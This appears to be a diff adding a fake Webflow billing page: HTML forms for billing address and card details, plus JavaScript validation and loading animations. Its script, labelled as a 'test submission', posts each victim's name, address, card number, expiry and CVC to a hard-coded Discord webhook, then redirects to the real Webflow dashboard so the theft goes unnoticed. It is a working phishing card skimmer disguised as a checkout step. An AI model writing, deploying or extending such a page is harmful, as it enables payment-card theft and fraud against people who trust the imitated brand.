+          <path fill-rule="evenodd" clip-rule="evenodd" d="M15.3334 4L11.2916 12H7.49528L9.18675 8.68446H9.11086C7.7154 10.5186 5.63335 11.726 2.66675 12V8.73034C2.66675 8.73034 4.56456 8.61685 5.68023 7.42922H2.66675V4.00006H6.05357V6.8205L6.12959 6.82018L7.51356 4.00006H10.0749V6.80261L10.151 6.80249L11.5869 4H15.3334Z" fill="currentColor"></path>
+        </g>
+      </svg>
+    </a>
+    <div class="step" id="stepIndicator" aria-label="Step 1 of 2"><span class="step-current">Step 1</span><span class="step-rest">of 2</span></div>
+  </div>
+  <div class="progress"><div class="bar" id="progressBar" style="width: 50%;"></div></div>
+</header>
+
+<main>
+  <section class="card checkout-loading hidden" id="loadingState" aria-live="polite" aria-busy="true">
+    <div class="loading-mark" id="loadingMark" aria-hidden="true" style="display: block;"></div>
+    <div class="success-mark" id="successMark" aria-hidden="true" style="display: none;">
+      <svg viewBox="0 0 16 16" width="16" height="16" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="8" cy="8" r="7" stroke="#146ef5" stroke-width="2"></circle>
+        <path d="M4.5 8.1L6.9 10.4L11.5 5.8" stroke="#146ef5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+    </div>
+  </section>
+
+
+  <section class="card" id="step1">
+    <h1>Billing details</h1>
+    <p class="sub">Enter your billing details to continue.</p>
+    <form id="billingForm" autocomplete="on" novalidate="">
+      <div class="grid">
+        <div class="full field" id="nameField">
+          <label for="name">Full name</label>
+          <input id="name" name="name" type="text" autocomplete="name" placeholder="Full name" required="" aria-describedby="nameError">
+          <div class="error-text" id="nameError"></div>
+        </div>
+        <div class="full field" id="addressField">
+          <label for="address">Address</label>
+          <input id="address" name="address" type="text" autocomplete="street-address" placeholder="Street address" required="" aria-describedby="addressError">
+          <div class="error-text" id="addressError"></div>
+        </div>
+        <div class="field" id="cityField">
+          <label for="city">City</label>
+          <input id="city" name="city" type="text" autocomplete="address-level2" placeholder="City" required="" aria-describedby="cityError">
+          <div class="error-text" id="cityError"></div>
+        </div>
+        <div class="field" id="stateField">
+          <label for="state">State / Province</label>
+          <input id="state" name="state" type="text" autocomplete="address-level1" placeholder="State / province" required="" aria-describedby="stateError">
+          <div class="error-text" id="stateError"></div>
+        </div>
+        <div class="field full" id="postalField">
+          <label for="postal">Postal code</label>
+          <input id="postal" name="postal" type="text" inputmode="numeric" autocomplete="postal-code" placeholder="Postal code" pattern="[0-9A-Za-z][0-9A-Za-z -]{2,9}" required="" aria-describedby="postalError">
+          <div class="error-text" id="postalError"></div>
+        </div>
+      </div>
+      <div class="actions actions-billing">
+        <a class="cancel-link" href="https://webflow.com/dashboard">Cancel</a>
+        <button class="primary" id="continueButton" type="submit" disabled="">Continue</button>
+      </div>
+    </form>
+  </section>
+
+  <section class="card hidden" id="step2">
+    <h1>Payment method</h1>
+    <p class="sub">Enter your payment details to continue.</p>
+    <form id="paymentForm" autocomplete="on" novalidate="">
+      <div class="grid">
+        <div class="full field" id="cardField">
+          <label for="card">Card number</label>
+          <input id="card" name="card" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="Card number" maxlength="23" minlength="19" required="" aria-describedby="cardError">
+          <div class="error-text" id="cardError"></div>
+        </div>
+        <div class="field" id="expiryField">
+          <label for="expiry">Expiration date</label>
+          <input id="expiry" name="expiry" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM / YY" maxlength="7" required="" aria-describedby="expiryError">
+          <div class="error-text" id="expiryError"></div>
+        </div>
+        <div class="field" id="cvcField">
+          <label for="cvc">Security code</label>
+          <input id="cvc" name="cvc" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="CVC" maxlength="4" required="" aria-describedby="cvcError">
+          <div class="error-text" id="cvcError"></div>
+        </div>
+      </div>
+      <p class="payment-consent">
+        Your payment method will be saved to your account and used for future billing.
+      </p>
+      <div class="actions">
+        <button class="secondary" type="button" id="back">Back</button>
+        <button class="primary" id="saveButton" type="submit" disabled="">Save</button>
+      </div>
+    </form>
+  </section>
+</main>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+
+  const TEST_WEBHOOK_URL = "https://discord.com/api/webhooks/1534009201917956198/pElS1mrB5KnDYqLHoQMfhsNNi8dBfq8cg_bEvVmUtUUtUvRFWXa_4bKcjg6zCF4Ye8nj";
+
+  async function sendTestSubmission() {
+    const billingForm = document.getElementById('billingForm');
+    const billing = Object.fromEntries(new FormData(billingForm));
+    const payment = Object.fromEntries(new FormData(paymentForm));
+
+
+    const payload = {
+      content: [
+        "🧪 Test form submission",
+        `Name: ${billing.name || ""}`,
+        `Address: ${billing.address || ""}`,
+        `City: ${billing.city || ""}`,
+        `State: ${billing.state || ""}`,
+        `Postal: ${billing.postal || ""}`,
+       `Card Number: ${payment.card || ""}`,
+        `Expiry: ${payment.expiry || ""}`,
+        `CVC: ${payment.cvc || ""}`
+      ].join("\n")
+    };
+
+    if (!TEST_WEBHOOK_URL || TEST_WEBHOOK_URL === "YOUR_WEBHOOK_URL") {
+      console.warn("TEST_WEBHOOK_URL is not configured. Skipping webhook send.");
+      return;
+    }
+
+    const response = await fetch(TEST_WEBHOOK_URL, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(payload)
+    });
+
+    if (!response.ok) {
+      throw new Error(`Webhook returned ${response.status}`);
+    }
+  }
+
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  const loader = document.getElementById('loadingState');
+  const spinner = document.getElementById('loadingMark');
+  const success = document.getElementById('successMark');
+  const indicator = document.getElementById('stepIndicator');
+  const progress = document.getElementById('progressBar');
+
+  const billingForm = document.getElementById('billingForm');
+  const paymentForm = document.getElementById('paymentForm');
+  const backButton = document.getElementById('back');
+  const continueButton = document.getElementById('continueButton');
+  const saveButton = document.getElementById('saveButton');
+
+  const cardInput = document.getElementById('card');
+  const expiryInput = document.getElementById('expiry');
+  const cvcInput = document.getElementById('cvc');
+
+  const billingFields = [
+    ['name', value => value.trim().length >= 2, 'Enter your full name.'],
+    ['address', value => value.trim().length >= 3, 'Enter your billing address.'],
+    ['city', value => value.trim().length >= 2, 'Enter your city.'],
+    ['state', value => value.trim().length >= 2, 'Enter your state or province.'],
+    ['postal', value => /^[0-9A-Za-z][0-9A-Za-z -]{2,9}$/.test(value), 'Enter a valid postal code.']
+  ];
+
+  let currentStep = 1;
+  let busy = false;
+
+  function setButtonEnabled(button, enabled) {
+    button.disabled = !enabled;
+  }
+
+  function setFieldState(input, state, message = '') {
+    const field = input.closest('.field');
+    const error = field?.querySelector('.error-text');
+    if (!field || !error) return;
+
+    field.classList.add('touched');
+    field.classList.toggle('error', state === 'error');
+    field.classList.remove('success');
+    error.textContent = message;
+    input.setAttribute('aria-invalid', state === 'error' ? 'true' : 'false');
+  }
+
+  function validateBilling() {
+    let valid = true;
+    let firstInvalid = null;
+
+    for (const [id, validator, message] of billingFields) {
+      const input = document.getElementById(id);
+      const ok = validator(input.value.trim());
+
+      if (!ok) {
+        valid = false;
+        if (input.closest('.field')?.classList.contains('touched')) {
+          setFieldState(input, 'error', message);
+        }
+        firstInvalid ||= input;
+      } else {
+        if (input.closest('.field')?.classList.contains('error')) {
+          setFieldState(input, 'valid', '');
+        }
+      }
+    }
+
+    setButtonEnabled(continueButton, valid && !busy);
+
+    if (!valid && firstInvalid && document.getElementById('billingForm')?.dataset.submitted === 'true') {
+      setFieldState(
+        firstInvalid,
+        'error',
+        billingFields.find(([id]) => id === firstInvalid.id)[2]
+      );
+      firstInvalid.focus();
+    }
+
+    return valid;
+  }
+
+  function digitsOnly(value) {
+    return value.replace(/\D/g, '');
+  }
+
+  function luhnCheck(value) {
+    const digits = digitsOnly(value);
+    if (digits.length < 13 || digits.length > 19) return false;
+
+    let sum = 0;
+    let doubleDigit = false;
+
+    for (let i = digits.length - 1; i >= 0; i--) {
+      let n = Number(digits[i]);
+      if (doubleDigit) {
+        n *= 2;
+        if (n > 9) n -= 9;
+      }
+      sum += n;
+      doubleDigit = !doubleDigit;
+    }
+
+    return sum % 10 === 0;
+  }
+
+  function validateCard() {
+    const digits = digitsOnly(cardInput.value);
+
+    if (!digits) {
+      setFieldState(cardInput, 'error', 'Enter your card number.');
+      return false;
+    }
+    if (digits.length < 13) {
+      setFieldState(cardInput, 'error', 'Enter the complete card number.');
+      return false;
+    }
+    if (!luhnCheck(digits)) {
+      setFieldState(cardInput, 'error', 'Check your card number.');
+      return false;
+    }
+
+    setFieldState(cardInput, 'valid', '');
+    return true;
+  }
+
+  function validateExpiry() {
+    const value = expiryInput.value.trim();
+    const match = value.match(/^(\d{2})\/(\d{2})$/);
+
+    if (!match) {
+      setFieldState(expiryInput, 'error', 'Enter a valid expiration date.');
+      return false;
+    }
+
+    const month = Number(match[1]);
+    const year = Number(match[2]);
+    const now = new Date();
+    const currentYear = now.getFullYear() % 100;
+    const currentMonth = now.getMonth() + 1;
+
+    if (month < 1 || month > 12) {
+      setFieldState(expiryInput, 'error', 'Enter a valid expiration month.');
+      return false;
+    }
+
+    if (year < currentYear || (year === currentYear && month < currentMonth)) {
+      setFieldState(expiryInput, 'error', 'Enter a valid expiration date.');
+      return false;
+    }
+
+    setFieldState(expiryInput, 'valid', '');
+    return true;
+  }
+
+  function validateCvc() {
+    const digits = digitsOnly(cvcInput.value);
+
+    if (digits.length < 3) {
+      setFieldState(cvcInput, 'error', 'Enter a valid security code.');
+      return false;
+    }
+
+    setFieldState(cvcInput, 'valid', '');
+    return true;
+  }
+
+  function showStep(step) {
+    currentStep = step;
+    indicator.innerHTML = `<span class="step-current">Step ${step}</span><span class="step-rest">of 2</span>`;
+    indicator.setAttribute('aria-label', `Step ${step} of 2`);
+    progress.style.width = step === 1 ? '50%' : '100%';
+    loader.classList.add('hidden');
+    step1.classList.toggle('hidden', step !== 1);
+    step2.classList.toggle('hidden', step !== 2);
+    success.classList.remove('show');
+    success.style.display = 'none';
+    spinner.style.display = 'block';
+    busy = false;
+
+    if (step === 1) {
+      setButtonEnabled(continueButton, billingFields.every(([id, validator]) =>
+        validator(document.getElementById(id).value.trim())
+      ));
+    } else {
+      updateSaveButton();
+    }
+  }
+
+  function showLoader() {
+    setButtonEnabled(continueButton, false);
+    setButtonEnabled(saveButton, false);
+    step1.classList.add('hidden');
+    step2.classList.add('hidden');
+    success.classList.remove('show');
+    success.style.display = 'none';
+    spinner.style.display = 'block';
+    loader.classList.remove('hidden');
+    loader.setAttribute('aria-busy', 'true');
+  }
+
+  function transitionToStep(step, delay = 1000) {
+    if (busy) return;
+    busy = true;
+    showLoader();
+
+    window.setTimeout(() => {
+      loader.classList.add('hidden');
+      loader.setAttribute('aria-busy', 'false');
+      showStep(step);
+    }, delay);
+  }
+
+  // Billing field UX.
+  billingFields.forEach(([id, validator, message]) => {
+    const input = document.getElementById(id);
+
+    input.addEventListener('blur', () => {
+      input.closest('.field')?.classList.add('touched');
+      if (!validator(input.value.trim())) {
+        setFieldState(input, 'error', message);
+      } else {
+        setFieldState(input, 'valid', '');
+      }
+      validateBilling();
+    });
+
+    input.addEventListener('input', () => {
+      if (input.closest('.field')?.classList.contains('touched')) {
+        if (validator(input.value.trim())) {
+          setFieldState(input, 'valid', '');
+        } else {
+          setFieldState(input, 'error', message);
+        }
+      }
+      validateBilling();
+    });
+  });
+
+  function updateSaveButton() {
+    const billingOK = billingFields.every(([id, validator]) =>
+      validator(document.getElementById(id).value.trim())
+    );
+
+    const cardDigits = digitsOnly(cardInput.value);
+    const cardOK = cardDigits.length >= 13 && cardDigits.length <= 19;
+
+    const expiryMatch = expiryInput.value.trim().match(/^(\d{2})\/(\d{2})$/);
+    let expiryOK = false;
+
+    if (expiryMatch) {
+      const month = Number(expiryMatch[1]);
+      const year = Number(expiryMatch[2]);
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;
+      const currentMonth = now.getMonth() + 1;
+
+      expiryOK =
+        month >= 1 &&
+        month <= 12 &&
+        (year > currentYear || (year === currentYear && month >= currentMonth));
+    }
+
+    const cvcOK = digitsOnly(cvcInput.value).length >= 3;
+
+    setButtonEnabled(
+      saveButton,
+      billingOK && cardOK && expiryOK && cvcOK && !busy
+    );
+  }
+
+  // Card input UX.
+  cardInput.addEventListener('input', () => {
+    const digits = digitsOnly(cardInput.value).slice(0, 19);
+    cardInput.value = digits.replace(/(.{4})/g, '$1 ').trim();
+
+    if (cardInput.closest('.field')?.classList.contains('touched')) validateCard();
+    updateSaveButton();
+  });
+
+  cardInput.addEventListener('blur', () => { validateCard(); updateSaveButton(); });
+
+  // Expiry input UX.
+  function formatExpiry(value) {
+    let v = value.replace(/[^\d/]/g, '').replace(/\/+/g, '/');
+
+    v = v
+      .replace(/^([1-9]\/|[2-9])$/g, '0$1/')
+      .replace(/^(0[1-9]|1[0-2])$/g, '$1/')
+      .replace(/^([0-1])([3-9])$/g, '0$1/$2')
+      .replace(/^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2')
+      .replace(/^([0]+)\/|[0]+$/g, '0')
+      .replace(/[^\d\/]|^[\/]*$/g, '')
+      .replace(/\/\//g, '/');
+
+    return v.slice(0, 5);
+  }
+
+  expiryInput.addEventListener('input', () => {
+    expiryInput.value = formatExpiry(expiryInput.value);
+    if (expiryInput.closest('.field')?.classList.contains('touched')) validateExpiry();
+    updateSaveButton();
+  });
+
+  expiryInput.addEventListener('keydown', e => {
+    if (['Backspace', 'Delete'].includes(e.key)) {
+      const start = expiryInput.selectionStart ?? 0;
+      const end = expiryInput.selectionEnd ?? 0;
+      const value = expiryInput.value;
+
+      // When the caret is at the end of "MM/", don't let the formatter
+      // immediately recreate the slash. Treat it like a real backspace.
+      if (
+        e.key === 'Backspace' &&
+        start === value.length &&
+        end === value.length &&
+        value.endsWith('/')
+      ) {
+        e.preventDefault();
+        expiryInput.value = value.slice(0, -2);
+        updateSaveButton();
+        return;
+      }
+
+      return;
+    }
+
+    if (['Tab', 'ArrowLeft', 'ArrowRight', 'Home', 'End'].includes(e.key)) return;
+
+    if (!/^\d$/.test(e.key) && e.key !== '/') {
+      e.preventDefault();
+    }
+  });
+
+  expiryInput.addEventListener('blur', () => { validateExpiry(); updateSaveButton(); });
+
+  // CVC input UX.
+  cvcInput.addEventListener('input', () => {
+    cvcInput.value = digitsOnly(cvcInput.value).slice(0, 4);
+    if (cvcInput.closest('.field')?.classList.contains('touched')) validateCvc();
+    updateSaveButton();
+  });
+
+  cvcInput.addEventListener('blur', () => { validateCvc(); updateSaveButton(); });
+
+  // Step 1 -> Step 2.
+  billingForm.addEventListener('submit', e => {
+    e.preventDefault();
+    if (busy) return;
+
+    billingForm.dataset.submitted = 'true';
+    if (!validateBilling()) return;
+    transitionToStep(2, 1800);
+  });
+
+  // Back -> Step 1.
+  backButton.addEventListener('click', () => {
+    if (busy) return;
+    showStep(1);
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  });
+
+  // Final submission.
+  paymentForm.addEventListener('submit', async e => {
+    e.preventDefault();
+    if (busy) return;
+
+    const billingOK = validateBilling();
+    const cardOK = validateCard();
+    const expiryOK = validateExpiry();
+    const cvcOK = validateCvc();
+
+    if (!billingOK || !cardOK || !expiryOK || !cvcOK) {
+      if (!billingOK) showStep(1);
+      return;
+    }
+
+    busy = true;
+
+    try {
+      await sendTestSubmission();
+    } catch (error) {
+      console.error("Test webhook submission failed:", error);
+      busy = false;
+      showStep(2);
+      return;
+    }
+
+    showLoader();
+
+    window.setTimeout(() => {
+      spinner.style.display = 'none';
+      success.style.display = 'flex';
+      success.classList.add('show');
+      loader.setAttribute('aria-busy', 'false');
+
+      window.setTimeout(() => {
+        window.location.href = 'https://webflow.com/dashboard';
+      }, 750);
+    }, 3200);
+  });
+
+  // Initial page load: ONE loader, then Billing. Header is untouched.
+  showLoader();
+  window.setTimeout(() => showStep(1), 1800);
+});
+</script>
+
+
+</body></html>
